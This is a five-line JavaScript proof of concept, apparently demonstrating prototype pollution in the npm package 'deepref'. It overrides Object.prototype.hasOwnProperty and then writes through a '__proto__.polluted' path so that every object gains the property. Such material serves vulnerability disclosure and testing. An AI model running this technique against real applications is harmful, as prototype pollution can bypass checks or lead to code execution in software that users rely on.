Object.prototype.hasOwnProperty = () => true;
console.log({}.polluted);
const deepref = require('deepref');
deepref.set({}, '__proto__.polluted', 'yes');
console.log({}.polluted);